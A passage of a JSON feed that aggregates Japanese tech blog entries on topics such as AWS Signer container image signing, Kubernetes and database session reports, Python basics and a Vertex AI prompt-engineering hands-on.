2024があり、そこでDB関連のセッションが半年前のKubeConから3倍近くに増えておりそれをまとめた内容です。KubeCon NA 2024の全DB関連セッションを紹介 - Speaker Deck2024年のはじめごろはGoogle Cloudを中心としたパブリッククラウドを主軸としたCloud Nativeから、Oracle x GKEを通してKubernetesという流れでした。データベースエンジニアを自称する限り、Kubernetesからは逃げられないと思っています。来年もKubernetesを頑張ります。2024年は全部で7本の登壇をしたようです。ブログ関連はてなブログでは主に読んだ論文やドキュメント、セッションレポートなどをまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。12月のアドベントカレンダーシーズンにKubeCon NAのセッションレポートを書いていたところ、最後の投稿が2023年の振り返りをするで焦ったのは秘密です。nnaka2992.hatenablog.comzennの方は2023年と同様に社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2025年も引き続き技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。全部で11本のブログを書いたようです。まとめ2024年はがむしゃらに本数を意識した1年でした。来年も数にはこだわっていきたいですが、内容はKubernetesとPostgreSQLとGoogle Cloudあたりに注力していけたらいいなと思っています。","isoDate":"2024-12-31T13:22:33.000Z","dateMiliSeconds":1735651353000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"rootful・rootless・privilegedコンテナの違い/rootful_rootless_privileged_container_difference","link":"https://speakerdeck.com/moz_sec_/rootful-rootless-privileged-container-difference","contentSnippet":"2024/12/28に開催されたOWASP KansaiのLTの資料です。\\rhttps://owasp-kansai.doorkeeper.jp/events/179740","isoDate":"2024-12-28T05:00:00.000Z","dateMiliSeconds":1735362000000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"CloudFrontの新機能『VPCオリジン』をTerraformで書いてみた","link":"https://zenn.dev/nextbeat/articles/aws_vpc_origin","contentSnippet":"1.VPCオリジンとは？AWS公式ブログでの記載Amazon Virtual Private Cloud (Amazon VPC) 内のプライベートサブネットでホストされているアプリケーションからのコンテンツ配信を可能にする新機能です。AWS re:Invent 2024で新発表された機能です。プライベートサブネット内のアプリケーションを直接CloudFrontを通じて配信可能なため、よりセキュアな構成を実現できる機能です。 従来の構成イメージ VPCオリジンを用いた構成イメージ 2.メリット ①セキュリティの強化ALBをパブリックサブネ...","isoDate":"2024-12-27T01:17:11.000Z","dateMiliSeconds":1735262231000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Youkiを動かしてみる","link":"https://qiita.com/ys1/items/7e92327c7728471cfc65","contentSnippet":"概要Kubernetesではコンテナを作成するとき、コンテナランタイム(高レベルランタイム、低レベルランタイム)を利用しています。低レベルランタイムであるyoukiを通じてコンテナに関する理解をちょっと深めます。Youkiとは?YoukiはRust言語で記載され...","isoDate":"2024-12-25T10:51:53.000Z","dateMiliSeconds":1735123913000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Shadcnを使っていてF8でキーボードのフォーカスが取られる","link":"https://zenn.dev/meziron/articles/a0410531f36ecc","contentSnippet":"shadcn を使っていて F8(半角カタカナ変換)がうまくいかない現象shadcn を使用して開発しているプロジェクトで、F8キーを押すとキーボードのフォーカスが奪われてしまい半角カタカナに変換がうまくいかないという現象にぶつかってしまいました。利用しているのUIライブラリなどを追っても中々原因が分からず困っていました。そこで F8 という文字列でコードベースを検索してみると、下記のような interface が見つかりました。interface ToastViewportProps extends PrimitiveOrderedListProps {    /** ...","isoDate":"2024-12-25T06:20:18.000Z","dateMiliSeconds":1735107618000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"AWS re:Invent 2024 へ行って来ました","link":"https://sreake.com/blog/aws-reinvent-2024/","contentSnippet":"スリーシェイクの山田です。 今回、Amazon Web Services (以下 AWS) が 12月 にラスベガスで開催した世界規模のカンファレンスである AWS re:Invent 2024 に現地参加してきたので、 […]The post AWS re:Invent 2024 へ行って来ました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-23T23:00:00.000Z","dateMiliSeconds":1734994800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Workforce Identity + Auth0 で Vertex AI Search の ACL 制御を行う","link":"https://zenn.dev/satohjohn/articles/a422ee68dd3485","contentSnippet":"3-shake AdventCalendar 第2シーズン 23日目の記事になります。2回目の登場です。今回は真面目な(?)技術記事になります。私としては前回書いた記事も大真面目でしたが。 概要今回やりたいこととしては、ウェブアプリケーション上で Id Provider(以後 IdP) 認証をして、その結果を利用して Vertex AI Agent Builder の Search 機能(以後めんどいので旧称の Vertex AI Search として説明) の ACL による検索の権限管理を行うというものです。今回 IdP として Auth0 を利用します。そのため、少し A...","isoDate":"2024-12-22T18:03:43.000Z","dateMiliSeconds":1734890623000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"AWS Signerにおけるコンテナ署名の実装","link":"https://blog.masasuzu.net/entry/2024/12/22/132803","contentSnippet":"この記事は3-shake Advent Calendar 2024の22日目の記事です。AWS Signerを使ったコンテナイメージの署名処理を扱った案件があったのでこちらの紹介となります。ただ、後述するように完成には至ってないです。それでもAWS Signerを使った署名処理と署名検証についての概要をお伝えできるかなと思います。今回のシステムはAWS ECS で Web サービスを運用しています。GitHub Actions を利用してデプロイを行っています。構成としては至ってベーシックな形になっています。今回、コンテナイメージのセキュリティ強化のため、ECR に保存されているイメージが改竄されていないことを保証する要件が追加されました。この記事では、AWS Signer を用いたコンテナイメージの署名と検証の実装、そして現状の課題と今後について記述します。AWS SignerとはWhat is AWS Signer? - AWS SignerAWS Signer はフルマネージドなコード署名サービスです。従来は Lambda 関数などで利用されていましたが、2023年の6月にECRのイメージ署名にも対応しました。AWS がコンテナイメージへの署名を導入Notary ProjectのNotation CLIを用いることで、ECRに保存されているコンテナイメージを署名することができ、署名ファイルをコンテナイメージとともにECRに保存できます。これによりコンテナイメージの真正性と完全性を検証することができます。ECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker Deckなお、AWS Signerによるイメージ署名に゙関してはNRI ネットコム様のスライドに詳しく書かれているのでこちらを参照するとより理解が深まります。デプロイフロー変更前デプロイフローとしてはGitHub Actionsでレポジトリ内のソースをdocker buildしたものをECRにpushし、ECS Serviceにデプロイするシンプルなワークフローになります。変更前変更後このワークフローにコンテナイメージ署名の処理を追加します。notationコマンドにSigner Profileのarnを指定して、署名と検証をそれぞれ行う形になります。今回は、GitHub Actions ワークフローに AWS Signer を使った処理を組み込みます。ECRにpushしたイメージに対して署名を行うように変更しました。署名したあとに署名検証を行うことになります。後述しますが、これだけだと本来は不完全なものです。変更後実装ここから実装を見て行きます。先述したワークフローに帰るために以下の変更が必要となります。インフラ側AWS Signer Profileの追加デプロイ用IAM RoleにAWS Signer Profileへのアクセス権の追加デプロイ側署名処理の追加Terraformインフラ側の変更を見ていきましょう。追加箇所としてはSigner Profileの追加とGitHub Actions用のIAM Policyへの権限追加となります。変更箇所以外は今回は割愛しています。platform_idを\\"Notation-OCI-SHA384-ECDSA\\"に指定してSigner Profileを作成します。レポジトリ名をProfile名にしており、レポジトリ名が - 区切りで、Profile名が - を使えないという事情で _ への置換処理をしています。Siner Profileresource \\"aws_signer_signing_profile\\" \\"main\\" {  platform_id = \\"Notation-OCI-SHA384-ECDSA\\"  # profile名に-が使えないので置換  name = replace(var.repository_name, \\"-\\", \\"_\\")}先に作ったSigner Profileへの\\"signer:GetSigningProfile\\"と\\"signer:SignPayload\\"の許可をデプロイ用のRoleのPolicyに付与します。GitHub Actions用IAM Roledata \\"aws_iam_policy_document\\" \\"deploy_policy\\" {  #前略  # イメージ署名  # Inline policies for Signer - AWS Signer  # https://docs.aws.amazon.com/ja_jp/signer/latest/developerguide/authen-inlinepolicies.html  statement {    sid    = \\"SignImage\\"    effect = \\"Allow\\"    actions = [      \\"signer:GetSigningProfile\\",      \\"signer:SignPayload\\"    ]    resources = [      var.signer_profile_arn    ]  }  # 後略}デプロイsigner policyのファイルをあらかじめ作っておきます。このPolicyを利用して、署名検証を行います。.github/aws/signer_policy.json{    \\"version\\":\\"1.0\\",    \\"trustPolicies\\":[      {          \\"name\\":\\"aws-signer-tp\\",          \\"registryScopes\\":[            \\"*\\"          ],          \\"signatureVerification\\":{            \\"level\\":\\"strict\\"          },          \\"trustStores\\":[            \\"signingAuthority:aws-signer-ts\\"          ],          \\"trustedIdentities\\":[            \\"arn:aws:signer:${region}:${account_id}:/signing-profiles/${profile_name}\\"          ]      }    ]}既存のECSのデプロイワークフローにnotationのインストール、イメージ署名処理、イメージ署名検証の処理を追記します。リリースブランチにpushされたことを契機にデプロイが走る形です。.github/workflows/deploy.yamlname: Deploy to ECSon:  push:    branches: [\'release\']env:  AWS_REGION: ap-northeast-1  ECR_REPOSITORY: ${レポジトリ名}  SIGNER_PROFILE_ARN: ${Signer Profile ARN}  SIGNER_POLICY_JSON: .github/aws/signer_policy.jsonjobs:  deploy:    name: Deploy to ECR, ECS    runs-on: ubuntu-latest    steps:      ### 前略      - name: Setup Notation        run: |          wget https://d2hvyiie56hcat.cloudfront.net/linux/amd64/installer/deb/latest/aws-signer-notation-cli_amd64.deb          sudo dpkg -i aws-signer-notation-cli_amd64.deb      - name: Sign image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation sign $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG --plugin \\"com.amazonaws.signer.notation.plugin\\" --id \\"$SIGNER_PROFILE_ARN\\"      - name: Verify image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation policy import $SIGNER_POLICY_JSON          notation verify $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG      ### 後略課題ここまででイメージの署名処理および署名検証の実装はできました。しかしながら、いくつか課題があります。CIとCDの分離先の実装を見るとわかるのですが、署名したイメージを即時署名検証していることがわかります。これは同じイメージに対して行われているため、実質的な検証にはなっていません。真の改竄検知のためには、CI/CD パイプラインを分離し、デプロイ時に別途署名検証を行う必要があります。また、pushしたコンテナイメージの脆弱性チェックもデプロイ前に行うことが望ましいです。そこで下記のように変更したいところです。ただ、デプロイのフローが変わってしまうので、調整が必要でまだ手をつけていない状態になります。理想正規手順以外でデプロイされたイメージの検証さらに、正規のデプロイフロー以外で起動されたタスクのイメージ検証も課題です。署名されていないイメージが起動されていても何もチェックができていない状態です。これに対するアプローチとしては、EventBridgeでタスクが起動したイベントを拾って、イメージの署名をチェックし、検証できなかったものに゙関しては処理を行う(タスクの停止や通知など)という方法があります。これはContainers on AWSで紹介されているので、この方法を実装できたらと考えています。Container image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWS署名検証のサービス統合ここまで見ていて気付いたかもしれませんが、ECS Serviceがタスクを起動するときに署名されているかどうかをチェックするようにECSサービスと統合されていれば、独自に署名検証を実装する必要はありません。このへん、Google CloudのBinary Authorizationはサービスと統合されているので、署名検証を自前で書く必要がないと理解してます。AWSもサービスと統合して楽に使えるようになることを期待してます。Binary Authorization の概要 \xa0|\xa0 Google Cloudまとめ現状でできていることは以下のとおりです。ECRへpushしたイメージの署名処理現状課題となっているものは以下のとおりです。CI/CDの分離署名されていないコンテナイメージが起動されていないかのチェックこの記事では、AWS Signer を用いたコンテナイメージの署名実装と、残された課題について説明しました。まだできていないことが多いですが、まずビルドしたイメージに対して署名を行うという第一歩を踏み出しました。ここから署名検証の仕組みを強化し、よりセキュアなコンテナ運用を実現するために、引き続き改善に取り組んでいきたいと思ってます。参考リンクAWS がコンテナイメージへの署名を導入AWS Signer と Amazon EKS におけるコンテナイメージ署名の提供開始 | Amazon Web Services ブログECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker DeckSign container images in Signer - AWS SignerContainer image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWSBinary Authorization の概要 \xa0|\xa0 Google Cloud","isoDate":"2024-12-22T04:28:03.000Z","dateMiliSeconds":1734841683000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[Python]ロギングの基本的な書き方","link":"https://zenn.dev/takehiro1111/articles/python_logging","contentSnippet":"loggingとは？ただ単純に表示させたいならprint文でも良いが、ログを残すのに特化した機能が豊富なライブラリ。ドキュメントでは以下のように定義されている。 参考logging は、あるソフトウェアが実行されているときに起こったイベントを追跡するための手段です。ソフトウェアの開発者は、特定のイベントが発生したことを示す logging の呼び出しをコードに加えます。イベントは、メッセージで記述され、これに変数データ (すなわち、イベントが起こる度に異なるかもしれないデータ) を加えることもできます。イベントには、開発者がそのイベントに定めた重要性も含まれます。...","isoDate":"2024-12-22T04:15:26.000Z","dateMiliSeconds":1734840926000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Python]datetimeモジュールの使い方","link":"https://zenn.dev/takehiro1111/articles/python_datetime","contentSnippet":"1.datetimeモジュールとは？ ドキュメントの記載datetime モジュールは、日付や時刻を操作するためのクラスを提供しています。日付や時刻に対する算術がサポートされている一方、実装では出力のフォーマットや操作のための効率的な属性の抽出に重点を置いています。 タイムゾーンの解決aware オブジェクトを必要とするアプリケーションのために、 datetime と time オブジェクトは追加のタイムゾーン情報の属性 tzinfo を持ちます。 tzinfo には抽象クラス tzinfo のサブクラスのインスタンスを設定できます。 これらの tzinfo ...","isoDate":"2024-12-21T06:37:30.000Z","dateMiliSeconds":1734763050000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"スリーシェイク所属の早川大貴がクラウドネイティブ技術を推進するCNCF Ambassadorsに就任","link":"https://sreake.com/blog/cncf_ambassadors/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）所属の早川大貴が、クラウドネイティブ技術を推進するCNCF Ambassadorsに就任したことをお知らせします。The post スリーシェイク所属の早川大貴がクラウドネイティブ技術を推進するCNCF Ambassadorsに就任 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-20T08:39:11.000Z","dateMiliSeconds":1734683951000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Python]@dataclassの使い方","link":"https://zenn.dev/takehiro1111/articles/python_class_dataclasses","contentSnippet":"@dataclassとは？デコレータの一種イニシャライザでフィールドに引数の値を設定する処理を自動で生成してくれる。 通常の設定class Nouse():  def __init__(self,name,age,gender,job)    self.name = name    self.age = age    self.gender = gender    self.job = job# 引数が多くなりインスタンス変数の設定が増えると管理や可視性の面で難しい。 @dataclassを用いた書き方from dataclasses imp...","isoDate":"2024-12-20T07:22:31.000Z","dateMiliSeconds":1734679351000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Python]Classの基礎文法についてまとめてみた","link":"https://zenn.dev/takehiro1111/articles/python_class_basic","contentSnippet":"Classの概念公式ドキュメントの記載クラスはデータと機能を組み合わせる方法を提供します。 新規にクラスを作成することで、新しいオブジェクトの 型 を作成し、その型を持つ新しい インスタンス が作れます。 クラスのそれぞれのインスタンスは自身の状態を保持する属性を持てます。 クラスのインスタンスは、その状態を変更するための (そのクラスが定義する) メソッドも持てます。 要約データ(属性)と、それを操作するための機能(メソッド)をひとまとまりにした「設計図」みたいなもの。その設計図をもとにいくつでもインスタンス(実体)を作れ、各インスタンスは自分用の属性と...","isoDate":"2024-12-20T06:17:07.000Z","dateMiliSeconds":1734675427000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"生成AIでGitHubソースコード取得して仕様書を作成","link":"https://speakerdeck.com/shukob/sheng-cheng-aidegithubsosukodoqu-de-siteshi-yang-shu-wozuo-cheng","contentSnippet":"https://generative-ai-conf.connpass.com/event/335205/\\r2024生成AI革命期を振り返る忘年会にて、\\r「生成AIでGitHubソースコード取得して仕様書を作成する」というテーマでLTさせていただきました。","isoDate":"2024-12-20T05:00:00.000Z","dateMiliSeconds":1734670800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"[Python]各データ型のメソッドを整理","link":"https://zenn.dev/takehiro1111/articles/python_class","contentSnippet":"1.List 特徴順序があり、変更可能（ミュータブル）。重複要素もOKで、インデックスで要素にアクセスできる メソッド一覧print(dir(list))[\'__add__\', \'__class__\', \'__class_getitem__\', \'__contains__\', \'__delattr__\', \'__delitem__\', \'__dir__\', \'__doc__\', \'__eq__\', \'__format__\', \'__ge__\', \'__getattribute__\', \'__getitem__\', \'__getstate__\', \'__gt__...","isoDate":"2024-12-20T02:25:26.000Z","dateMiliSeconds":1734661526000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"KueueによるKubernetesネイティブなジョブ制御を試してみる","link":"https://sreake.com/blog/kueue-kubernetes-native-job-control/","contentSnippet":"Kueue KueueはKubernetesのSIG-Schedulingのサブプロジェクトとして開発が進められている、クラスター内のバッチ・HPC・AI/MLといったジョブのキューイングを提供するAPIとコントローラの […]The post KueueによるKubernetesネイティブなジョブ制御を試してみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-19T03:05:13.000Z","dateMiliSeconds":1734577513000,"authorName":"Sreake","authorId":"Sreake"},{"title":"プロンプトエンジニアリング プログラミング ハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/12/17/185729","contentSnippet":"genai-users.connpass.comこの記事は上記勉強会の資料です。shu-kob.hateblo.jp↑上記記事を参考にサービスアカウントの設定をしてください。※ Google Cloudの無料期間が終了していると、課金されますが、ハンズオンの内容だけだと数百円もいかないと考えています。料金は確実には言えないので、Google Cloudはご自身の責任でご使用ください。github.com↑今回のサンプルコードgit clone https://github.com/shu-kob/prompt_engineeringcd prompt_engineeringpip install vertexaiLangChainを使わずVertex AIのライブラリを使用シンプルなVertex AIでGeminiを実行project_id = \\"PROJECT_ID\\" # 書き換える実行python3 generate_content.pyresponse = model.generate_content(  \\"プロンプトエンジニアリングとは\\")プロンプトを変更して実行してみましょう。Zero Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 zero_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 NHK公開\\"\\"\\"プロンプトを変更して実行してみましょう。Few Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 few_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」:政治「岡田将生&高畑充希結婚 SNS反応」:芸能\\"\\"\\"プロンプトを変更して実行してみましょう。LangChainを使用langchain_google_vertexai を使用pip install langchain_google_vertexaipython3 invoke.pymessages = [  (\\"human\\", \\"ネコの鳴き真似をしてください。\\"),]プロンプトを変更して実行してみましょう。PromptTemplateを使用pip install langchain_corepip install pydantic==2.9.0実行python3 prompt_template.pyプロンプトテンプレートやQuestionを変更して実行してみましょう。ChatPromptTemplateを使用実行python3 chat_prompt_template.pyprompt_template = ChatPromptTemplate.from_messages([    (\\"system\\", \\"ステップバイステップで考えてください。\\"),    (\\"human\\", \\"{question}\\"),])question = \\"\\"\\"10 + 2 * 3 - 4 * 2\\"\\"\\"システムプロンプトやQuestionを変更して実行してみましょう。参考資料python.langchain.compython.langchain.com参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門Google Gemini 1.5／LlamaIndex／LangChain 人工知能プログラミング実践入門","isoDate":"2024-12-17T09:57:29.000Z","dateMiliSeconds":1734429449000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU 上の PaliGemma2 に私の娘は可愛いと言わせるまで","link":"https://zenn.dev/satohjohn/articles/33b27212b3a55e","contentSnippet":"この記事は 3-shake Advent Calendar 2024 シーズン1 16日目の記事 & Jagu\'e\'r Advent Calendar 2024 4日目の記事 になります。3-shake に入社してそろそろ丸2年が経過しようとしており、感慨深く思っております。こういうカレンダーをちゃんと埋められているのをみていても、アウトプットという形で自己研鑽や表現を行う素晴らしいメンバーが多いなと日々日々感じております。そんな中で書けるのも良い経験だと感じております。という前置きを入れつつ、今回は生成 AI の中でも OSS でマルチモーダルな LLM である PaliG...","isoDate":"2024-12-16T11:20:30.000Z","dateMiliSeconds":1734348030000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"業務用Macセットアップ備忘録","link":"https://qiita.com/masaru-komiyama/items/cbd7d140cabf131688d9","contentSnippet":"この記事はアドベントカレンダー「3-shake Advent Calendar 2024 シリーズ2」の16日目の記事です。はじめに業務用Macの利用環境に関するセットアップ備忘録を記述しています。設定、導入アプリ、利用しているハードウェアなどをメモった形。ご利用...","isoDate":"2024-12-15T14:45:01.000Z","dateMiliSeconds":1734273901000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"KubeCon NA 2024: Goodbye etcd! Running Kubernetes on Distributed PostgreSQLのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/15/goodbyte_etcd_running_kubernetes_on_distributed_postgresql","contentSnippet":"この記事は以下アドベントカレンダー15日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Goodbye etcd! Running Kubernetes on Distributed PostgreSQL セッションレポートセッション概要 https://kccncna2024.sched.com/event/1i7rt/goodbye-etcd-running-kubernetes-on-distributed-postgresql-denis-magda-yugabyteセッション動画 www.youtube.comこのセッションはKubernetesクラスタのメタデータストアとして利用されるetcdをDistributed PostgreSQLであるYugabyteDBに置き換えた方法を紹介し、デモを行っています。What\'s etcd?セッションはetcdの解説から始まりました。etcdは分散可能で可用性の高いキーバリューストアであり、シンプルながらも強力なデータベースとして機能します。Raftプロトコルを用いることで、複数のマシンやVMで構成されたクラスタ全体にわたって変更を複製し、ノード障害発生時にも一貫したデータと継続的な動作を保証します。Kubernetesはこのetcdをメタデータストアとして活用し、サービスのポート数やデプロイメントのPod数といったクラスタの状態を管理しています。このセクションはetcdの役割を明確に示し、Kubernetesにおける重要性を理解する上で有用でした。etcdがKubernetesの心臓部と言える重要な役割を担っていることを再認識させられました。Why some are not happy with etcdetcdは多くのKubernetesクラスタで標準的に利用されていますが、大規模環境（100～1000ノード）ではスケーラビリティに課題があることが指摘されました。このようなケースでは、etcdから分散データベースへの移行が必要となります。さらに、etcdプロジェクトへのコントリビュータ不足も懸念材料として挙げられており、Kubernetesが必要とする機能追加への対応が遅れる可能性が示唆されました。このセクションは、etcdの潜在的な問題点を浮き彫りにし、代替手段を検討する必要性を示唆しています。特に大規模運用を想定している場合、etcdのスケーラビリティの限界は深刻な問題になり得ます。KineKineはKubernetesクラスタとリレーショナルデータベース間の仲介役として機能するシミュレータレイヤです。etcd APIをSQLに変換することで、PostgreSQLやMySQLのようなリレーショナルデータベースをKubernetesのメタデータストアとして利用可能にします。Kubernetes APIサーバーが発行したetcd APIをKineがSQLに変換し、データベースに実行することで、etcdの代替を実現します。このセクションはKineの動作原理を簡潔に説明し、リレーショナルデータベースをKubernetesと統合する仕組みを理解する上で重要です。Kineの存在によって、既存のデータベース基盤を活用したKubernetes運用が可能になります。Hands-onデモ環境はGoogle Cloud上の3つのCompute Engine（us-westリージョンの異なるゾーン）に構築されたk3sクラスタで、純粋なPostgreSQLと分散型PostgreSQLであるYugabyteDBの2つのシナリオが示されました。純粋なPostgreSQLは単一VMで、YugabyteDBは3台のVMで実行され、マルチゾーン、マルチリージョン、マルチクラウド/オンプレミス環境への拡張可能性が示唆されました。このセクションはデモ環境の概要を説明し、異なるデータベース構成でのKubernetes運用の可能性を示しています。実環境に近い構成でのデモは、KineとYugabyteDBの有効性を理解する上で非常に役立ちます。Kubernetes on Pure PostgreSQLyoutu.beこのデモでは、PostgreSQLが動作するサーバ上でk3sを実行し、Kineが必要とするオブジェクトがPostgreSQLに作成される様子、そしてk3s自体の動作確認が示されました。既存のPostgreSQL環境へのKubernetesの導入を検討する際に、このデモは具体的な手順と動作イメージを提供してくれます。データベース管理者にとって、Kineによるデータベースへの影響を視覚的に確認できる点は非常に重要です。Kubernetes on YugabyteDBYugabyteDBとは？YugabyteDBは、PostgreSQL互換の分散SQLデータベースです。クエリレイヤはPostgreSQLからフォークされ、ストレージレイヤはLSMツリーベースの実装1を採用しています。複数サーバ・複数リージョンでの運用が可能で、クエリ分散やノード障害時の継続動作を実現します。etcdと同様にRaftプロトコルを利用することで、データの一貫性を確保し、ネットワーク分断時のスプリットブレインにも対応します。このセクションはYugabyteDBの特徴を説明し、高可用性と分散性を備えたデータベースとしての利点を明確に示しています。etcdの代替としてYugabyteDBを検討する際に、この情報は非常に重要です。デモyoutu.beYugabyteDBクラスタ上でk3sを実行するデモでは、PostgreSQLの場合とほぼ同様の手順でKubernetesを起動できることが示されました。YugabyteDBのダッシュボードを用いて、データベースの情報やKineが作成した情報を確認できる点も強調されました。さらに、Kubernetesのサンプルアプリを起動することで、etcdベースのKubernetesと同等の動作が確認されました。1台のCompute Engineを停止させることでYugabyteDBノードの障害をシミュレートし、データベースとKubernetesが継続して動作することを実証しました。このデモは、YugabyteDBの耐障害性と高可用性を視覚的に示し、実運用環境での信頼性を裏付けています。結論このセッションは、KineとYugabyteDBを用いることで、etcdの代替としてリレーショナルデータベースをKubernetesのメタデータストアとして利用できることを示しました。特に、YugabyteDBの分散性と耐障害性は、大規模Kubernetesクラスタの運用においてetcdのスケーラビリティやコントリビュータ不足といった課題を解決する可能性を示唆しています。ただし、YugabyteDBの導入には運用コストや学習コストといった新たな課題も発生するため、etcdとの比較検討が必要です。同様にセッションではKineをネイティブに利用しているk3sを利用していますが、k3sはあくまでKubernetesの軽量ディストリビューションであるため完全に同じものではないため、本当にk3sで良いのかという比較検討も必要になります。またセッション内では100を超えるノードから構成されるKubernetesクラスタではetcdのスケーラビリティが足りず、他のメタデータストアが必要になると紹介していますが、なぜ必要になるかは説明が不足していると感じました。これはKubernetesクラスタが大規模化することでAPIサーバが発行するクエリがetcdの対応可能な10000 rpsを越え始めるためです。より詳細な説明はGoogle Cloudの65000ノードを越えるGKEクラスタをSpannerでホストしていることを紹介しているブログが参考になるでしょう。cloud.google.com","isoDate":"2024-12-15T14:16:36.000Z","dateMiliSeconds":1734272196000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes The Hard Wayにトライする","link":"https://zenn.dev/moz_sec/articles/0dbb3b7dd08ab3","contentSnippet":"KuberenetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ Kuberentes The Hard WayKubernetes The Hard Wayとは、kubeadmやkubesplayのような、クラスタ構築ツールに頼らず、コンテナランタイムや各コンポーネントを自分でインストールして、設定をし、Kubernetes...","isoDate":"2024-12-15T12:14:59.000Z","dateMiliSeconds":1734264899000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Reckoner における Datadog Error Tracking の活用事例","link":"https://zenn.dev/nomadblacky/articles/1901ceb9154c7b","contentSnippet":"この記事は、3-shake Advent Calendar 2024 の 15 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。Reckoner では多種多様な連携先に対応しているため、様々なエラーが発生する可能性があります。そのため、エラーの迅速な発見と...","isoDate":"2024-12-15T10:35:38.000Z","dateMiliSeconds":1734258938000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"KubeCon NA 2024: Database DevOps: CD for Stateful Applicationsのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/14/database_devops_cd_for_stateful_applications","contentSnippet":"この記事は以下アドベントカレンダー14日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1Database DevOps: CD for Stateful Applications セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7na/database-devops-cd-for-stateful-applications-stephen-atwell-harnessio-christopher-crow-pure-storage?linkback=grid-fullセッションスライドhttps://static.sched.com/hosted_files/kccncna2024/86/Harness-Portworx%20Kubecon%202024.pdfこの記事内の画像は全てこのスライドより引用しています。セッション動画  www.youtube.comこのレポートでは、KubeCon + CloudNativeCon North America 2024 のセッション「Database DevOps: CD for Stateful Applications」の内容をまとめたもので、DatabaseのDevOpsとステートフルアプリケーションの継続的デリバリについてです。データベースCDの課題と解決策セッションでは、データパイプラインのデータテストをデリバリパイプラインに統合することの重要性が強調されていました。従来、データベースのテストは、BIツールなどを用いたカスタマイズされた方法で行われることが多かったようですが、最も信頼性の高いテスト方法は、新旧バージョンで同じデータに対してテストを実行することだとスピーカーは主張していました。そして、Kubernetesはこのようなテストを大幅に簡略化できるとのことでした。この主張は、データベースの変更がアプリケーション全体に及ぼす影響を正確に把握し、本番環境へのデプロイ前に潜在的な問題を早期に発見するために非常に重要です。Kubernetesによるデータベース運用の進化セッションで紹介されたアーキテクチャの進化は、Kubernetesがデータベース運用にもたらす利点を明確に示していました。初期のアーキテクチャでは、アプリケーション、データベース、インフラストラクチャの変更が個別に管理されていましたが、発展したアーキテクチャでは、これらが統合されたCI/CDパイプラインで管理されています。この統合により、アプリケーション、データベース、インフラストラクチャの変更をE2Eでテストできるようになり、本番環境へのデプロイリスクを大幅に軽減できます。このアーキテクチャの進化は、マイクロサービスアーキテクチャやクラウドネイティブ開発との親和性が高いと言えます。マイクロサービスでは、個々のサービスが独立してデプロイされるため、データベースの変更が他のサービスに及ぼす影響を正確に把握することが重要です。Kubernetesはこのような複雑な依存関係を管理